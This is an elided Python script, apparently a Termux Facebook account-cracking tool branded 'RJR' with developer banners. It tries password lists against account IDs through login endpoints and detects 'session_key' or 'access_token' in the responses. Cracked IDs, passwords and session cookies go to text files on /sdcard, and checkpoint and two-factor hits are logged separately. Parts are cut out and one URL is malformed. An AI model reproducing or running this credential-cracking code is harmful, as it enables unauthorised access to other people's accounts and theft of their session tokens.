...
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://t.me/tebshakibcayber07'
...
try:
	prox= requests.get(https//t.me/tebshakibcayber07).text
...
def arfan1():
        ...
        return ua
#-----------------------------------------------------#
#os.system("xdg-open https://github.com/AR4AN-MUAZ")
...
\33[1;92m─────────────────────────────────────────────
\33[1;92m DEVELOPER    \33[1;91m ◉     \x1b[38;5;48mTEB SHAKIB	  
\33[1;92m FACEBOOK \33[1;91m     ◉     \x1b[38;5;208mTeb Shakib	 	
\33[1;92m GITHUB     \33[1;91m   ◉    \x1b[38;5;47m TEB SHAKIB CAYBER ZONE	\33[1;91m[\33[1;95mRJR\33[1;91m]
\33[1;92m─────────────────────────────────────────────
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bRJR}[{G}RJR-M2{bRJR}]-[{G}%s{bRJR}]-[{G}OK:%s{bRJR}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bRJR}[{G}LIVE-OK{bRJR}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/RJR-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[RJR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[RJR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RJR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/RJR-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bRJR}[{G}RJR-M1{bRJR}]-[{G}%s{bRJR}]-[{G}OK:%s{bRJR}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                linex()
                open('/sdcard/RJR-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRJR-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRJR}[{G}•{bRJR}]{G} '+kuki+'')
                linex()
                open('/sdcard/RJR-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRJR}[{G}•{bRJR}]{G} '+kuki+'')
                linex()
                open('/sdcard/RJR-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
